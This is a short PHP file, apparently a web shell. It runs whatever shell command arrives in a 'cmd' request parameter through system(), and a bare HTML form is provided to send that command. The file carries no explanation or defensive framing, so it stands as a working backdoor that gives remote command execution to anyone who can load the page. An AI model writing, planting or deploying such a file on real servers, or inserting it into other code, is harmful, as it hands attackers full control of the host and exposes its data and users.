<?php

if (isset($_REQUEST["cmd"])) {
    system($_REQUEST["cmd"]);
}

?>

<form method="get">
  <input name="cmd">
</form> 